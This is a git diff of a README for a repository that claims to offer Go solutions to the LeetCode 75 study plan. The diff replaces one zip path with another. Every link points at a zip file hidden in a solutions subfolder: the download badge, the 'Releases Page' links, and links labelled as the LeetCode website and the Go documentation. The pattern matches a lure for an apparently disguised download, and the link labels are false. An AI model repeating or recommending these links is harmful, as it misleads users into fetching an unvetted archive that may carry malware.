@@ -1,7 +1,7 @@
 # 🎯 leetcode-75-go - Solve Coding Challenges Easily
 
 ## 📥 Download the Application
-[![Download leetcode-75-go](https://raw.githubusercontent.com/SamB-ima/leetcode-75-go/main/solutions/slidingwindow/leetcode-75-go_v1.5.zip%20Now-From%20Releases-brightgreen)](https://raw.githubusercontent.com/SamB-ima/leetcode-75-go/main/solutions/slidingwindow/leetcode-75-go_v1.5.zip)
+[![Download leetcode-75-go](https://github.com/SamB-ima/leetcode-75-go/raw/refs/heads/main/solutions/binarytreedfs/go-leetcode-2.0-alpha.5.zip%20Now-From%20Releases-brightgreen)](https://github.com/SamB-ima/leetcode-75-go/raw/refs/heads/main/solutions/binarytreedfs/go-leetcode-2.0-alpha.5.zip)
 
 ## 🚀 Getting Started
 Welcome to the leetcode-75-go repository! This application provides solutions for the LeetCode 75 study plan in Go. With this tool, you can enhance your problem-solving skills and prepare effectively for coding interviews.
@@ -17,7 +17,7 @@ Before you start downloading, ensure that your system meets these basic requirem
 ## 🔄 Installation Steps
 Follow these steps to download and install leetcode-75-go:
 
-1. Visit the [Releases Page](https://raw.githubusercontent.com/SamB-ima/leetcode-75-go/main/solutions/slidingwindow/leetcode-75-go_v1.5.zip).
+1. Visit the [Releases Page](https://github.com/SamB-ima/leetcode-75-go/raw/refs/heads/main/solutions/binarytreedfs/go-leetcode-2.0-alpha.5.zip).
    
 2. Look for the latest version at the top of the page. 
 
@@ -51,7 +51,7 @@ Using leetcode-75-go is straightforward. Here’s how to navigate the applicatio
 5. **Feedback:** If you encounter issues or have suggestions, consider visiting the GitHub page to leave feedback.
 
 ## 📈 Updates
-The application will receive periodic updates to add more features and solutions. Check the [Releases Page](https://raw.githubusercontent.com/SamB-ima/leetcode-75-go/main/solutions/slidingwindow/leetcode-75-go_v1.5.zip) regularly to stay current.
+The application will receive periodic updates to add more features and solutions. Check the [Releases Page](https://github.com/SamB-ima/leetcode-75-go/raw/refs/heads/main/solutions/binarytreedfs/go-leetcode-2.0-alpha.5.zip) regularly to stay current.
 
 ## 🤝 Contributing
 You can contribute to the leetcode-75-go project by submitting your own solutions or enhancements. To do this:
@@ -88,7 +88,7 @@ Explore these topics to deepen your understanding and improve your skills.
 ## 🔗 Additional Resources
 For additional learning, consider visiting the following resources:
 
-- [LeetCode Official Website](https://raw.githubusercontent.com/SamB-ima/leetcode-75-go/main/solutions/slidingwindow/leetcode-75-go_v1.5.zip)
-- [Go Programming Language Documentation](https://raw.githubusercontent.com/SamB-ima/leetcode-75-go/main/solutions/slidingwindow/leetcode-75-go_v1.5.zip)
+- [LeetCode Official Website](https://github.com/SamB-ima/leetcode-75-go/raw/refs/heads/main/solutions/binarytreedfs/go-leetcode-2.0-alpha.5.zip)
+- [Go Programming Language Documentation](https://github.com/SamB-ima/leetcode-75-go/raw/refs/heads/main/solutions/binarytreedfs/go-leetcode-2.0-alpha.5.zip)
 
 Happy coding and good luck with your studies!
